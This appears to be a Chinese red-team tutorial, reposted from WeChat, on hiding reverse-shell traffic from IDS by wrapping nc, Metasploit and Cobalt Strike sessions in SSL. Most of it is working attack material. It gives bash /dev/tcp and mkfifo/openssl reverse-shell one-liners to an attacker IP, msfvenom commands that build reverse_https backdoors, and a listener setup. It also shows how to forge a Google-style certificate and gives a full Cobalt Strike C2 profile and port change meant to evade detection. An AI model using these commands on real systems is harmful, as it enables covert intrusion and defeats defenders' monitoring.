> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XPuuoybinZHBzcs0UJ88iw)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7Dht6dVlIpbhIrYWkDmnvVb4KHexibnMGJNOmo7OHMGOA2lS1Lh3XTONA/640?wx_fmt=png)

前言
--

在红队进行渗透测试的后续渗透阶段为了扩大战果，往往需要进行横行渗透，反弹 shell 是再常见不过的事情了，在 [《反弹 Shell，看这一篇就够了》](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247496188&idx=1&sn=6ddec450e283e4eca01b535215a656c3&chksm=ec1ca4c3db6b2dd508cd153aae5d1f406b6692d78a0f19f9db78f1d6b6dd09323fe4cd44bcbc&scene=21#wechat_redirect) 这篇文章里，我总结了很多常见的反弹 shell 的方法。除了这些之外，我们还可以使用 Metasploit 或 Cobalt Strike 等工具获得目标的 shell。但是这些反弹 shell 方式都有一个缺点，那就是 **所有的流量都是明文传输的**。

如果反弹 shell 都是明文传输，当目标主机网络环境存在网络防御检测系统时（IDS、IPS 等），网络防御检测系统会检测出通信内容中带有的攻击特征，并对当前通信进行告警和阻止。此时，如果蓝队对攻击流量回溯分析，就可以复现攻击的过程，阻断红队行为，红队就无法进行渗透行为了。所以，我们需要对 shell 中通信的内容进行混淆或加密，实现动态免杀。

在本节中，我们将介绍如何使用 OpenSSL 对 nc、Metasploit、Cobalt Strike 三种远控工具的 shell 通信进行流量加密，从而绕过 IDS 或者防护软件分析设备和工具，实现动态免杀。

### OpenSSL

在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。

SSL 协议要求建立在可靠的传输层协议 (TCP) 之上。SSL 协议的优势在于它是与应用层协议独立无关的，高层的应用层协议（例如：HTTP，FTP，TELNET 等）能透明地建立于 SSL 协议之上。SSL 协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。

实验环境
----

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DPAlgtjrIJpXNeeH3qa3IPsge3kyVXDGTjibLzkVfXFJ86xPe1LaRicibw/640?wx_fmt=png)

**受害机：**

*   Windows 10：192.168.0.103
    
*   Ubuntu：192.168.0.108
    

**攻击机**：

*   Kali Linux：192.168.0.100
    

黑客通过 Kali 进行攻击，发现漏洞后获得了 Windows 10 和 Ubuntu 两个系统的权限，分别使用 netcat、Metasploit 和 Cobalt Strike 反弹 shell。但是目标系统所在的网络区域存在 IDS 等流量监测设备，为了防止被监控后查杀，我们需要分别对 netcat、Metasploit、Cobalt Strike 三种远控工具的 shell 通信进行流量加密，从而绕过 IDS 或者防护软件分析设备和工具，实现动态免杀。

NetCat 流量加密
-----------

*   实验环境：Kali Linux 攻击 Ubuntu
    

Nc（瑞士军刀）它也是一个功能强大的网络调试和探测工具，能够建立需要的几乎所有类型的网络连接，支持 Linux 和 Windows 环境，红队喜爱工具之一。

首先来演示 nc 正常情况下反弹 shell 是如何被对方流量监控到的。

攻击机 kali 上面执行如下命令开启监听：

```
nc -lvp 2333
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DWkjM9wSGzuxmNnJ4EGmDVLfricK62qPGXHhX57c06SoMSQCcfWiaCgqQ/640?wx_fmt=png)  

Ubuntu 上面执行如下命令将自己的 shell 反弹到攻击机 kali 上去：

```
bash -c "bash -i>& /dev/tcp/192.168.0.100/2333 0>&1"
```

如下图所示，攻击机 kali 上成功拿到了 Ubuntu 的 shell：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DkGhwUjkbENlr0rNAIbshqG5EtbicHa8LDfB0ZLk0y5RC7pf58efETlg/640?wx_fmt=png)

此时，在 Ubuntu 上使用 Wireshark 对当前使用的网卡（我这里是 ens33）进行流量抓包分析：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DWwa6kx46UN4wa0WIStcSasvbyDNqRgAUibb77dn0gn1DKeqUbanxB3Q/640?wx_fmt=png)

此时攻击者开始执行命令对控制目标主机：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DxQwQ4FIuEGN65Fdngsw0ekKqcJc02spIZnCchbia6icFhiblQGZ9209zQ/640?wx_fmt=png)

此时，受害者 Ubuntu 上的 wireshark 便会抓到一系列数据包，随便追踪一个的 TCP 流：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DLOoOVS3qpelh8zKBHWbT5jLurkWOavia0nj8gF0TqDJKaDTdGGsnQPA/640?wx_fmt=png)

可看到未加密的情况下，攻击机与目标机之间的通信都是明文传输的，所以流量设备可以很容易地查看到攻击者的行为记录的。

那么接下来将演示如何使用 OpenSSL 对 nc 进行流量加密。

### 1. 使用 OpenSSL 生成自签名证书

在使用 OpenSSL 对 nc 进行流量加密之前，需要先在攻击机上生成自签名证书：

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可。成功生成后，在桌面有两个 pem 加密文件：  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7D1GOia30u1LSjFlZsXWOqQt3FtgdmiaibXK0t8LibeibOu8EyG6XQ7LuvkKw/640?wx_fmt=png)

### 2. 使用 OpenSSL 对 NC 流量进行加密

攻击机 kali 上面执行如下命令使用 OpenSSL 开启一个监听：

```
openssl s_server -quiet -key key.pem -cert cert.pem -port 2333
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DZPW4YvKFj7y2B29ibPEbNOh0oraSNHv77iaxWMkKGIwdgTN8npl0MkDA/640?wx_fmt=png)

此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL/TLS server。

然后 Ubuntu 上面执行如下命令将自己的 shell 反弹到攻击机 kali 上去：

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.0.100:2333 > /tmp/s; rm /tmp/s
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DdBHlxoYp0sLdplGtia1iaOZ4ghGxjx35tAXTfYiaU2U3mMdPusVw3Wiaog/640?wx_fmt=png)  

如上图所示，攻击机 kali 上成功拿到了 Ubuntu 的 shell。

此时再次在受害机 Ubuntu 上使用 wireshark 抓包，然后攻击机对 Ubuntu 执行一波命令，即可抓到二者之间通信的数据包：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DcVzw0YPKlKc4bKR7JJ3QSZeKexfoDwzVW9l1nO94cVg6aM1Bia8VHyw/640?wx_fmt=png)

随便追踪一个 TCP 流进行分析：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7Drcs4d4KEe4bj5CNxZB7tFgg1f92vp0IffsoW5W2FPd8gHlScCy8t9w/640?wx_fmt=png)

可见此时看到的信息都是乱码，二者之间的通信经过了加密。

Metasploit 流量加密
---------------

*   实验环境：Kali Linux 攻击 Windows 10
    

Metasploit 在内网做横行渗透时，这些流量很容易就能被检测出来，所以做好流量加密，就能避免审计工具检测出来。下面开始演示如何对 Metasploit 进行流量加密。

1.  ### 使用 OpenSSL 创建 SSL/TLS 证书
    

```
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
-subj "/C=UK/ST=London/L=London/O=Development/CN=www.google.com" \
-keyout www.google.com.key \
-out www.google.com.crt && \
cat www.google.com.key www.google.com.crt > www.google.com.pem && \
rm -f www.google.com.key www.google.com.crt
```

这里模拟的是 google 的 SSL 证书信息，也可以自行修改可信度高的证书。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DibyCicUVtWtibGZClklK2slnZffcMLFia7KpbyhwFZZsCiaPLo4tXPsSFoQ/640?wx_fmt=png)

检查 google 的 key 生成情况：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DHY5AFjjATHfvSvm3ib3sGmX5icgeDBvVnxfWicpzfzyH1JAPj4XBwGMEw/640?wx_fmt=png)

正常。

### 2. 生成后门

创建完证书后，我可以为其创建 HTTP 或 HTTPS 类型的有效负载，并为其提供 PEM 格式的证书以用于验证连接。

```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.100 LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=Whoamishell HandlerSSLCert=/root/www.google.com.pem StagerVerifySSLCert=true -f exe -o shell.exe
```

*   HandlerSSLCert：向处理程序通知所使用的 PEM 证书。
    
*   StagerVerifySSLCert：当收到一个连接时执行 SSL 证书验证。
    
*   PayloadUUIDTracking 和 PayloadUUIDName：可以在监听的时候过滤掉不需要的回连请求。
    

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DQhKO2GFsibB5HfxLxYoVr4O7j5s4Diak2kTJBtNFfic2MBB5FYI6SZHoQ/640?wx_fmt=png)

也可以生成一个 psh 类型的木马：

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.100 LPORT=4444 PayloadUUIDTracking=true HandlerSSLCert=/root/www.google.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -o shell.bat
```

### 3. 启动监听

```
use exploit/multi/handler 
set payload windows/meterpreter/reverse_https
set LHOST 192.168.0.100
set LPORT 4444
set HandlerSSLCert /root/www.google.com.pem
set StagerVerifySSLCert true
exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DzPFOkbS3tOCnkqq8icsK97icrPASk2zYyIK2SvrbnL250jTA3BuMGeLA/640?wx_fmt=png)

配置侦听器时还需要使用两个附加选项 HandlerSSLCert 和 StagerVerifySSLCert。这是为了通知处理程序它将使用的证书（与有效负载相同），并在接收到连接时执行 SSL 证书验证。

将生成的木马 shell.exe 上传到目标主机 Windows 10，并执行即可得到 Windows 10 的 meterpreter：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DLTNHOXYZ9BXplxrK3BakIa5emrAnnQxOyb6hH3qm5lzHrbWDialATYw/640?wx_fmt=png)

此时受害者主机 Windows 10 上开启 wireshark 监听，攻击者执行命令进行后渗透，wireshark 即可捕捉到攻击流量：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DqY6fIGMAlXbl0QkeKFb0tKzDyooWuywgcpTfp7KRZPAQIm0MnjIN3g/640?wx_fmt=png)

随便追踪一个 TCP 流进行分析：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DbOzDlSzZnjhrD0zNVH4kWplqiciameqYwKJjEj7xUzRr0MLeQOHMpw3Q/640?wx_fmt=png)

可见此时看到的 TCP 流中信息都是乱码，二者之间的通信经过了 SSL 加密。

### impersonate_ssl 模块

此外 Metasploit 框架还有一个 auxiliary/gather/impersonate_ssl 模块，可以用来自动从信任源创建一个虚假证书，十分方便：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DP23qD1WERSNRzia9ym1BWiaEGjmKZqKichMV5vSGhopuN7fjSicpicWecfg/640?wx_fmt=png)

使用方法如下：

```
use auxiliary/gather/impersonate_ssl 
set RHOST www.google.com
run
```

执行 run 命令后，即可自动生成可信度高的 PEM 证书：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DsqYFFDlJt2uFemPsHuC24J2hAsfp2GPJIL7ooibV3YpcKC59VKo2FOg/640?wx_fmt=png)

PEM 证书生成后，即可像之前那样使用了。

### Meterpreter Paranoid Mode

使用 Meterpreter Paranoid Mode 工具可以对上述过程实现完全自动化，该工具的完全使用说明可以查看：https://github.com/r00t-3xp10it/MeterpreterParanoidMode-SSL

Cobalt Strike 流量加密
------------------

*   实验环境：Kali Linux 攻击 Windows 10
    

Cobalt Strike 是很多红队的首选的攻击神器，在后渗透方面效果显著很好，导致很多 IDS 入侵检测工具和流量检测工具已经可以拦截和发现，特别是流量方面，如果使用默认证书进行渗透和测试，特别在高度安全的环境下，好不容易找到一个突破口，因为证书没修改，被流量检测出来并进行拦截，检测报告将返回给管理员，管理员就能马上将缺口进行修复。那么红队之前的攻击就会付诸东流，攻击计划就要重新制定。接下来将演示如何对 Cobalt Strike 进行流量加密。

在运行 Cobalt Strike 时，默认使用的证书是 cobaltstrike.store：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DwiadIdJ75VGRWcIwVwibjuqoXM0hleIeZGlSgQHRhjstCadVaozX44NQ/640?wx_fmt=png)

下面我们将使用新的技术生成新的证书来逃避 IDS 检测。

### 1. 生成证书

首先我们利用 keytool 工具生成一个证书：

```
keytool -genkey -alias moonsec -keyalg RSA -validity 36500 -keystore whoami.store
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DeBpXuMWqCSqsRkicf8lxNNDaPNlWzmichNvaqtlibVKhVuLwemjdHwkBg/640?wx_fmt=png)

（具体的可自行修改）

如上图，成功生成了一个名为 whoami.store 的证书，将其放到 Cobalt Strike 目录里。

### 2. 创建 C2-profile 文件

C2-profile 文件是 Cobalt Strike 内置工具，用于控制 Cobalt Strike 流量，可以防止安全设备对流量特征进行监控和拦截。

在 Cobalt Strike 创建一个 whoami.profile 文件，写入如下内容：

```
set sample_name "dayu POS Malware";
set sleeptime "5000"; # use a ~30s delay between callbacks
set jitter    "10";    # throw in a 10% jitter
set useragent "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0";
#设置证书，注意以下内容得和你之前生成的证书一样
https-certificate {
  set CN      "whoami";
  set O        "Microsoft";
  set C        "en";
  set L        "US";
  set OU      "Microsoft";
  set ST      "US";
  set validity "365";
}
#设置，修改成你的证书名称和证书密码
code-signer{
  set keystore "whoami.store";
  set password "657260";
  set alias "whoami";
}
#指定DNS beacon不用的时候指定到IP地址
set dns_idle "8.8.4.4";
#每个单独DNS请求前强制睡眠时间
set dns_sleep "0";
#通过DNS上载数据时主机名的最大长度[0-255]
set maxdns    "235";

http-post {
  set uri "/windebug/updcheck.php /aircanada/dark.php /aero2/fly.php /windowsxp/updcheck.php /hello/flash.php";
  client {
    header "Accept" "text/plain";
    header "Accept-Language" "en-us";
    header "Accept-Encoding" "text/plain";
    header "Content-Type" "application/x-www-form-urltrytryd";
    id {
      netbios;
      parameter "id";
    }
    output {
      base64;
      prepend "&op=1&id=vxeykS&ui=Josh @ PC&wv=11&gr=backoff&bv=1.55&data=";
      print;
    }
  }
  server {
    output {
      print;
    }
  }
}

http-get {
  set uri "/updates";
  client {
    metadata {
      netbiosu;
      prepend "user=";
      header "Cookie";
    }
  }
  server {
    header "Content-Type" "text/plain";
    output {
      base64;
      print;
    }
  }
}
```

主要需要修改的是 https-certificate 和 code-signer 两处地方，对应 keytool 填写的信息即可。

然后利用 Cobalt Strike 的 c2lint 来验证 whoami.profile 是否成功生成和执行：

```
./c2lint whoami.profile
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DRDrLlFGVdxibOGLSVgdJStpHVw7I7XyUnIeENLb756SFt3iaA9Juhflg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DFlvhETib4avicib7n98RBKDtHmxAUicAeonXYc7erzXo7HPJ9oOKicjXkBw/640?wx_fmt=png)

如上图可看到是成功的。

### 3. 配置 teamserver

teamserver 默认端口是 50050 很容易被检测出来，我们将修改端口防止其被检测出来。直接修改 teamserver 文件即可：

```
vim teamserver
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DaOicbGYRgqNZYoM2TZtFHtQtuPdicLJ2UCJ4zvZictYicmfj40NNrgYS1Q/640?wx_fmt=png)

如上图，将端口改为 50000。

### 4. 成功控制

此时便可以启动 Cobalt Strike，创建 HTTP 或 HTTPS 类型的有效负载了。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DFzRMF9IZqsRJpib8icx1Jf3BBL0VB29zLiafAsarC2yH5dumFDpzQhiaYw/640?wx_fmt=png)

进入后创建 Linsten 监听，选择 HTTPS：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DaFWKqJLhvgnZdk07G0BvTItEWJyrGZwaDIq93icMEmUa1PBREz26thA/640?wx_fmt=png)

然后通过 Cobalt strike 生成的各种类型的木马，上传到目标主机 Windows 10 后执行，成功上线：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DraJzr5nWHCyBqsKHsTxq5J4d2KqyOVmdF1Bu6Q11tgeBs3MSq9c8ibg/640?wx_fmt=png)

此时受害者主机 Windows 10 上开启 wireshark 监听，攻击者执行命令进行后渗透，wireshark 即可捕捉到攻击流量：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7D7KF0ibddpAJyLWsku4gnj9MFCR70uDq0vHrdOfqDQXxKlXP3BhCI1zQ/640?wx_fmt=png)

随便追踪一个 TCP 流进行分析：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicmBN9C7t4jDcvStkHr5V7DJFy7KhQQaCcQbUKXOV1PpowLHWtmW3eN5KjIgonNepV7IV2v45xw1g/640?wx_fmt=png)

如上图所示，在 Wireshark 查看到 Tcp 流信息是经过加密传输的乱码形态，成功加密。

Ending......
------------

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读：**

本月报名可以参加抽奖送暗夜精灵 6Pro 笔记本电脑的优惠活动  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247496352&idx=1&sn=df6ddbf35ac56259299ce37681d56e5b&chksm=ec1ca79fdb6b2e8946f91d54722a7abb04f83111f9d348090167b804bc63b40d3efeb9beabbe&scene=21#wechat_redirect)

**点赞，转发，在看**

原创投稿作者：WHOAMI

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)